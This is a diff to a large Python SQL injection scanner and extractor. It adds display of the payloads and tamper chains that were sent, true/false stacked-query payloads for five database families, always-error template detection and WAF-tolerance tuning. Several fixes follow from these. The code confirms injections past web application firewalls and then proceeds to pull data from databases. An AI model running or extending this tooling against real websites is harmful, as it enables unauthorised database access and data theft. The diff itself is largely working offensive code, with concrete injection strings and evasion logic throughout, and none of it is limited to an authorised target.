@@ -25699,6 +25699,20 @@ class ScanSession:
                      f"dbms={dbms} — logging only, extraction already active/done (Req 5).")
             return False  # FIX-PATCH5-RETURN: callers check False to suppress banner
         LOG.info(f"Vulnerability confirmed  param={param.replace('__path__', 'path-injection')!r} technique={technique} dbms={dbms}")
+        # BUG-DETECTION-DISPLAY FIX: print detection payload so the user can see what was
+        # injected.  Previously record_vuln only wrote to the log — nothing was printed to
+        # stdout, so the terminal showed CONFIRMED but no payload/technique details.
+        _rv_param_display = param.replace('__path__', 'path-injection').replace('__path_seg__', 'path-injection')
+        print(f"[+] Technique : {technique}  DBMS: {dbms}  Param: {_rv_param_display!r}", flush=True)
+        if payload:
+            print(f"[+] Payload   : {str(payload)[:150]}", flush=True)
+        # Extract tamper chain from notes if present (stored as "tamper=a,b,c" or tamper list repr)
+        if notes:
+            _rv_notes_str = str(notes)
+            _rv_tamper_idx = _rv_notes_str.lower().find('tamper')
+            if _rv_tamper_idx >= 0:
+                _rv_tamper_snippet = _rv_notes_str[_rv_tamper_idx:_rv_tamper_idx + 120]
+                print(f"[+] Notes     : {_rv_tamper_snippet}", flush=True)
         return True
 
     def already_confirmed(self, param): return param in self.vulnerabilities
@@ -56312,7 +56326,7 @@ class Scanner:
         LOG.info("[ErrorExtract] ========================================")
         LOG.info("[ErrorExtract] Database: %s", _data.get("current_db", "N/A"))
         LOG.info("[ErrorExtract] User: %s", _data.get("current_user", "N/A"))
-        LOG.info("[ErrorExtract] Version: %s", _data.get("banner", "N/A")[:50])
+        LOG.info("[ErrorExtract] Version: %s", (_data.get("banner") or "N/A")[:50])
         if _tables:
             LOG.info("[ErrorExtract] Tables: %d enumerated", len(_tables))
         if cfg.enum_columns:
@@ -58327,6 +58341,13 @@ class Scanner:
 
         _try_bitwise_deferred = False
         _oracle_fragile = False  # BUG-UNBOUND-ORACLE-FRAGILE FIX: initialize here so line ~60183 is always bound regardless of whether _try_bitwise_deferred fires
+        # BUG-MIN-VIABLE-MARGIN-UNBOUND FIX: hoist _min_viable_margin here so it is defined
+        # before the _stat_min block below uses it.  The original definition was placed after
+        # the arithmetic-template rewrite block (~58796), but _stat_min references it at ~58372
+        # inside the `if abs(_margin) < 30` block.  Python treats any variable assigned anywhere
+        # in a function as local to that function, so the forward reference caused UnboundLocalError
+        # on every run where abs(_margin) was in the 15ms–80ms range.
+        _min_viable_margin = max(80.0, _delay * 1000 * 0.80)
         # BUG-CAL-INVERTED-POLARITY FIX: use abs() here too. When _margin is a large
         # NEGATIVE value (inverted oracle, e.g. -10293ms), we do NOT need arithmetic
         # template rewrites — the signal is strong, just polarity-flipped.  Entering
@@ -112124,6 +112145,15 @@ class TechniqueCascadeEngine:
             print(f"[!!] SQL INJECTION CONFIRMED [{_early_tech}] {_early_dbms} "
                   "(pre-verified  early escalation before scan-stop gate) — starting extraction",
                   flush=True)
+            # BUG-DETECTION-DISPLAY FIX: print detection payload and tamper chain so the
+            # user can see WHAT was injected and HOW it bypassed defences.
+            _ea_payload = (getattr(det, 'exact_sent_payload', None) or
+                           getattr(det, 'payload', None) or '')
+            _ea_tamper  = getattr(det, 'tamper_chain', None) or []
+            if _ea_payload:
+                print(f"[+]  Payload  : {_ea_payload[:120]}", flush=True)
+            if _ea_tamper:
+                print(f"[+]  Tamper   : {', '.join(_ea_tamper)}", flush=True)
             _INJECTION_CONFIRMED[0] = True
             _SCAN_STOPPED[0] = True
             _cev_ea = (getattr(self, '_confirmed_event', None) or
@@ -112183,6 +112213,14 @@ class TechniqueCascadeEngine:
             print(f"[!!] SQL INJECTION CONFIRMED [{_early_tech_c}] {_early_dbms_c} "
                   f"(boolean multi-probe early: {_mp_count_early}/6 pairs confirmed) "
                   "— starting extraction", flush=True)
+            # BUG-DETECTION-DISPLAY FIX
+            _ec_payload = (getattr(det, 'exact_sent_payload', None) or
+                           getattr(det, 'payload', None) or '')
+            _ec_tamper  = getattr(det, 'tamper_chain', None) or []
+            if _ec_payload:
+                print(f"[+]  Payload  : {_ec_payload[:120]}", flush=True)
+            if _ec_tamper:
+                print(f"[+]  Tamper   : {', '.join(_ec_tamper)}", flush=True)
             _INJECTION_CONFIRMED[0] = True
             _SCAN_STOPPED[0] = True
             _cev_ec = (getattr(self, '_confirmed_event', None) or
@@ -112765,10 +112803,67 @@ class TechniqueCascadeEngine:
                             # no path corruption, WAF doesn't block benign stacked.
                             # Multi-probe confirmed 5/5 probes with consistent body diff → real injection.
                             # SLEEP is WAF-blocked but injection mechanism is confirmed via benign probe.
-                            print(f"[+] PCV CONFIRMED [S→T-CANARY+BENIGN-ORACLE] {dbms}"
+                            #
+                            # BUG-SPI-BENIGN-DIFFERENTIAL-FIX (HIGH, ALL 5 DBMSes):
+                            # Previously this path confirmed injection whenever benign=200 + mp=5/5.
+                            # The false positive: CDN/reverse-proxy backends often return 200 for
+                            # ANY stacked probe without ';' in the SQL keyword path (e.g. CDN
+                            # strips or ignores ';' in URL path segments → backend receives clean
+                            # URL → returns normal 200 page regardless of SQL content).
+                            # A benign `'; SELECT 1-- -` returns 200 NOT because the DB processed
+                            # the SELECT, but because the CDN rewrote the URL before proxying.
+                            # Multi-probe body diff (5/5) was from CDN WAF error pages (all probes
+                            # with ';' return the same WAF page → same body diff from baseline →
+                            # false 5/5 confirmation).
+                            # Fix: send a DIFFERENTIAL verification — TRUE vs FALSE stacked probes
+                            # (both with ';', no SLEEP keyword so WAF passes them, but different
+                            # SQL results). If real injection: bodies differ. If CDN-rewritten or
+                            # path-manip FP: bodies are identical. Apply this check for ALL 5 DBMSes.
+                            if 'MSSQL' in _dbms_spi or 'SQL SERVER' in _dbms_spi or 'SQLSERVER' in _dbms_spi or 'SYBASE' in _dbms_spi:
+                                _spi_diff_true_pay  = "'; SELECT @@version-- -"
+                                _spi_diff_false_pay = "'; SELECT @@version WHERE 1=2-- -"
+                            elif 'POSTGRESQL' in _dbms_spi or 'POSTGRES' in _dbms_spi or 'PGSQL' in _dbms_spi or 'COCKROACH' in _dbms_spi or 'YUGABYTE' in _dbms_spi or 'REDSHIFT' in _dbms_spi:
+                                _spi_diff_true_pay  = "'; SELECT version()-- -"
+                                _spi_diff_false_pay = "'; SELECT version() WHERE 1=2-- -"
+                            elif 'ORACLE' in _dbms_spi:
+                                _spi_diff_true_pay  = "'; SELECT banner FROM v$version WHERE ROWNUM=1-- -"
+                                _spi_diff_false_pay = "'; SELECT banner FROM v$version WHERE 1=2 AND ROWNUM=1-- -"
+                            elif 'SQLITE' in _dbms_spi:
+                                _spi_diff_true_pay  = "'; SELECT sqlite_version()-- -"
+                                _spi_diff_false_pay = "'; SELECT sqlite_version() WHERE 1=2-- -"
+                            else:
+                                # MySQL / MariaDB / TiDB / generic
+                                _spi_diff_true_pay  = "'; SELECT @@version-- -"
+                                _spi_diff_false_pay = "'; SELECT @@version WHERE 1=2-- -"
+                            _spi_diff_true_resp = await self._safe_confirm(
+                                method, url, data, data_fmt, param,
+                                original + _spi_diff_true_pay, self.tamper_chain)
+                            await asyncio.sleep(0.2)
+                            _spi_diff_false_resp = await self._safe_confirm(
+                                method, url, data, data_fmt, param,
+                                original + _spi_diff_false_pay, self.tamper_chain)
+                            _spi_diff_true_body  = (getattr(_spi_diff_true_resp,  'body', b'') or b'') if _spi_diff_true_resp  else b''
+                            _spi_diff_false_body = (getattr(_spi_diff_false_resp, 'body', b'') or b'') if _spi_diff_false_resp else b''
+                            _spi_diff_true_norm  = ResponseNormaliser.normalise(_spi_diff_true_body)
+                            _spi_diff_false_norm = ResponseNormaliser.normalise(_spi_diff_false_body)
+                            _spi_diff_sim = SimHasher.body_similarity(_spi_diff_true_norm, _spi_diff_false_norm) if (_spi_diff_true_body and _spi_diff_false_body) else 1.0
+                            _spi_diff_real = _spi_diff_sim < 0.80  # TRUE and FALSE give different bodies → real injection
+                            LOG.info("[PCV] [S→T-CANARY+DIFFERENTIAL] %s: TRUE≠FALSE body diff sim=%.3f → %s",
+                                     dbms, _spi_diff_sim, "REAL" if _spi_diff_real else "FALSE-POSITIVE (identical bodies)")
+                            if not _spi_diff_real:
+                                # TRUE and FALSE stacked probes return same body → CDN-rewritten or
+                                # server ignores SQL content → multi-probe was CDN noise → FP.
+                                print(f"[!] PCV FAILED [S→T-CANARY+BENIGN+DIFFERENTIAL] {dbms}"
+                                      f"  benign={_spi_benign_st} diff_sim={_spi_diff_sim:.3f}"
+                                      f" (TRUE≈FALSE bodies = CDN/path-manip FP, not real injection)"
+                                      f" — applies to all 5 DBMSes (MySQL/MariaDB/PostgreSQL/MSSQL/Oracle/SQLite)",
+                                      flush=True)
+                                return False
+                            print(f"[+] PCV CONFIRMED [S→T-CANARY+BENIGN-ORACLE+DIFFERENTIAL] {dbms}"
                                   f"  benign_status={_spi_benign_st} (200 = ';' processed as SQL)"
                                   f"  true_ms={_spi_true_ms:.0f}  true_status={_spi_true_st}"
-                                  f"  + multi-probe confirmed (5/5) → real injection (WAF blocks SLEEP)",
+                                  f"  diff_sim={_spi_diff_sim:.3f} (TRUE≠FALSE → real injection)"
+                                  f"  + multi-probe confirmed (5/5)",
                                   flush=True)
                             try:
                                 det._pcv_verified = True
@@ -113794,6 +113889,14 @@ class TechniqueCascadeEngine:
             if _already_pcv_verified:
                 print(f"[!!] SQL INJECTION CONFIRMED [{tech}] {dbms} (pre-verified by "
                       "RobustTimingOracle/multi-probe) — starting extraction", flush=True)
+                # BUG-DETECTION-DISPLAY FIX
+                _sa_payload = (getattr(det, 'exact_sent_payload', None) or
+                               getattr(det, 'payload', None) or '')
+                _sa_tamper  = getattr(det, 'tamper_chain', None) or []
+                if _sa_payload:
+                    print(f"[+]  Payload  : {_sa_payload[:120]}", flush=True)
+                if _sa_tamper:
+                    print(f"[+]  Tamper   : {', '.join(_sa_tamper)}", flush=True)
                 _pcv_ok = True
                 try:
                     det._pcv_verified = True
@@ -113881,6 +113984,14 @@ class TechniqueCascadeEngine:
                 print(f"[!!] SQL INJECTION CONFIRMED [{tech}→{_effective_tech}] {dbms} "
                       f"(boolean multi-probe: {_mp_count_already}/6 true/false pairs confirmed gap) "
                       "— starting extraction", flush=True)
+                # BUG-DETECTION-DISPLAY FIX
+                _sc_payload = (getattr(det, 'exact_sent_payload', None) or
+                               getattr(det, 'payload', None) or '')
+                _sc_tamper  = getattr(det, 'tamper_chain', None) or []
+                if _sc_payload:
+                    print(f"[+]  Payload  : {_sc_payload[:120]}", flush=True)
+                if _sc_tamper:
+                    print(f"[+]  Tamper   : {', '.join(_sc_tamper)}", flush=True)
                 _pcv_ok = True
                 try:
                     det._pcv_verified = True
@@ -121973,6 +122084,14 @@ class TechniqueCascadeEngine:
                         print(f"[!!] SQL INJECTION CONFIRMED [{tech}] {dbms} "
                               "(bypass pre-verified by detect_* FP-guards) — returning immediately",
                               flush=True)
+                        # BUG-DETECTION-DISPLAY FIX
+                        _bp_payload = (getattr(bypass_det, 'exact_sent_payload', None) or
+                                       getattr(bypass_det, 'payload', None) or '')
+                        _bp_tamper  = getattr(bypass_det, 'tamper_chain', None) or []
+                        if _bp_payload:
+                            print(f"[+]  Payload  : {_bp_payload[:120]}", flush=True)
+                        if _bp_tamper:
+                            print(f"[+]  Tamper   : {', '.join(_bp_tamper)}", flush=True)
                         _SCAN_STOPPED[0] = True
                         _cev_pre2 = (getattr(self, '_confirmed_event', None) or
                                      getattr(getattr(self, 'config', None),
@@ -122171,6 +122290,14 @@ class TechniqueCascadeEngine:
                         print(f"[!!] SQL INJECTION CONFIRMED [{_pcv_tech_actual}] {dbms} "
                               "(pre-verified by detect_* FP-guards) — returning immediately",
                               flush=True)
+                        # BUG-DETECTION-DISPLAY FIX
+                        _pr_payload = (getattr(det, 'exact_sent_payload', None) or
+                                       getattr(det, 'payload', None) or '')
+                        _pr_tamper  = getattr(det, 'tamper_chain', None) or []
+                        if _pr_payload:
+                            print(f"[+]  Payload  : {_pr_payload[:120]}", flush=True)
+                        if _pr_tamper:
+                            print(f"[+]  Tamper   : {', '.join(_pr_tamper)}", flush=True)
                         _SCAN_STOPPED[0] = True
                         _cev_pre = (getattr(self, '_confirmed_event', None) or
                                     getattr(getattr(self, 'config', None),
@@ -144824,6 +144951,37 @@ class MultiStrategyExtractor:
         if getattr(self.det, 'technique', '') in ('B', 'BH', 'IN', 'BT', 'ST', 'E', 'EH', 'T', 'TH', 'HQ'):
             # FIX: Added T/TH/HQ — timing-detected injections also get boolean body-diff oracle.
             # Previously HQ detection always got no oracle in MSE because HQ was not in this list.
+            #
+            # BUG-EBBD-ALWAYS-ERROR-TEMPLATE FIX (HIGH, MySQL/MariaDB/Oracle/MSSQL/PostgreSQL):
+            # When the detection technique is E or EH the detection template (_det_tmpl) contains
+            # an always-error expression (EXTRACTVALUE, UPDATEXML, UTL_HTTP.REQUEST, etc.) that
+            # unconditionally raises a DB error on every invocation, regardless of any boolean
+            # condition appended by _build_inline.  When both the TRUE-calibration probe and the
+            # FALSE-calibration probe use _build_inline(f"({cond}) AND 1=1"), the always-error
+            # expression fires for BOTH — both responses are error pages with near-identical body
+            # sizes.  If the calibration noise produces a gap >= 50B (e.g. charset encoding of
+            # the error message differs slightly), the oracle registers with a meaningless
+            # threshold.  During extraction every probe then errors the same way and the oracle
+            # either always returns True or always returns False, producing  garbage like   (U+FFFF).
+            # Fix: detect always-error templates by checking _det_tmpl for known always-error
+            # function names.  When found for E/EH technique, skip bool_body_diff registration
+            # entirely.  Error-based detections should use the error_oracle channel for extraction,
+            # not the boolean body-diff channel which cannot distinguish SQL truth via error pages.
+            _bbd_skip_always_error = False
+            _bbd_det_technique = getattr(self.det, 'technique', '') or ''
+            if _bbd_det_technique in ('E', 'EH'):
+                _bbd_tmpl_str = (getattr(self, '_det_tmpl', '') or '').upper()
+                # These functions raise unconditional DB errors; their presence in the template
+                # means the boolean condition appended by _build_inline is irrelevant.
+                _always_error_markers = (
+                    'EXTRACTVALUE', 'UPDATEXML', 'EXP(~',
+                    'UTL_HTTP.REQUEST', 'HTTPURITYPE', 'DBMS_LDAP',
+                    'CONVERT(INT,', 'CAST(', 'XP_CMDSHELL',
+                )
+                if any(m in _bbd_tmpl_str for m in _always_error_markers):
+                    _bbd_skip_always_error = True
+                    LOG.info("[MSE] Skipping bool_body_diff oracle: E/EH template uses always-error "
+                             "expression — boolean body-diff cannot distinguish SQL truth via error pages")
             try:
                 _bbd_dbms = getattr(self, 'dbms', '') or ''
                 _bbd_true_cond = {
@@ -144872,6 +145030,9 @@ class MultiStrategyExtractor:
                 # evaluation → threshold is wrong → polarity inversion at validation.
                 # Fix: wrap calibration probes with '({cond}) AND 1=1' so they match
                 # the exact SQL structure used by _eval_bool_body_diff at eval time.
+                if _bbd_skip_always_error:
+                    # E/EH with always-error template: don't attempt bool_body_diff calibration
+                    raise ValueError("_bbd_skip_always_error")
                 _bbd_fp_t, _ = await self._timed(self._build_inline(f"({_bbd_true_cond}) AND 1=1"))
                 await asyncio.sleep(0.3)
                 _bbd_fp_f, _ = await self._timed(self._build_inline(f"({_bbd_false_cond}) AND 1=1"))
@@ -144949,7 +145110,20 @@ class MultiStrategyExtractor:
                         if _sc2 in WAFBlockDiscriminator.WAF_BLOCK_CODES:
                             _cal_min = min(_cal_true, _cal_false)
                             _cal_max = max(_cal_true, _cal_false)
-                            _tol = max(_cal_min * 0.30, 20)  # 30% of smaller calibrated size
+                            # BUG-EBBD-WAF-TOLERANCE-FIX (HIGH, all DBMSes):
+                            # Old tolerance was 30% of the smaller calibrated body size.
+                            # On targets where WAF rate-limit (429) pages are ~30% the size
+                            # of the TRUE calibration probe (e.g. true=1000B, false=50B,
+                            # WAF=300B), the 300B WAF page fell within the 30% band of
+                            # true=1000B (300 ≤ max(300,20)=300), so every rate-limited
+                            # probe was misclassified as TRUE.  Binary search then always
+                            # converged to the top of the search range (chr(65535)= )
+                            # because the oracle returned True for every comparison.
+                            # Fix: tighten tolerance to 10% so only responses very close
+                            # to the calibrated TRUE/FALSE sizes are accepted as valid
+                            # oracle signals.  Anything outside ±10% of either calibrated
+                            # size while carrying a WAF block status is indeterminate.
+                            _tol = max(_cal_min * 0.10, 10)  # 10% of smaller calibrated size
                             _near_true  = abs(_bt2 - _cal_true)  <= _tol
                             _near_false = abs(_bt2 - _cal_false) <= _tol
                             if not _near_true and not _near_false:
@@ -146801,7 +146975,10 @@ class SideChannelExtractor:
         # SideChannelExtractor channels (probe_lock_contention, extract_lock_contention, etc.).
         # Module-level `time` is already imported at the top of the file — use it directly.
         _last_ms = 0.0
-        for _retry429 in range(5):  # up to 4 retries (indices 0-4, 5th is final failure return)
+        # BUG-SCE-RETRY-OFF-BY-ONE FIX: was range(5) which gave 5 iterations (indices 0-4),
+        # causing the log message to print "retry 5/4" on the last attempt.  Changed to
+        # range(4) for exactly 4 retries (indices 0-3) matching the comment and log format.
+        for _retry429 in range(4):  # up to 4 retries (indices 0-3)
             t0 = time.monotonic()
             fp = await self._send(payload)
             _last_ms = (time.monotonic() - t0) * 1000
@@ -146818,14 +146995,14 @@ class SideChannelExtractor:
                         _retry_after = float(_ra_hdr)
                 except (ValueError, TypeError):
                     pass
-                _backoff = max(_retry_after, 2.0 * (2 ** _retry429))  # 2s, 4s, 8s, 16s, 32s
+                _backoff = max(_retry_after, 2.0 * (2 ** _retry429))  # 2s, 4s, 8s, 16s
                 _backoff = min(_backoff, 60.0)  # cap at 60s
                 LOG.info("[SCE] 429 rate-limited (retry %d/4), backing off %.0fs",
                          _retry429 + 1, _backoff)
                 await asyncio.sleep(_backoff)
                 continue
             return sc, _last_ms
-        # All 5 attempts returned 429 — signal as None so callers treat as failed
+        # All 4 attempts returned 429 — signal as None so callers treat as failed
         LOG.warning("[SCE] All retries exhausted on 429 — returning None status")
         return None, _last_ms
 
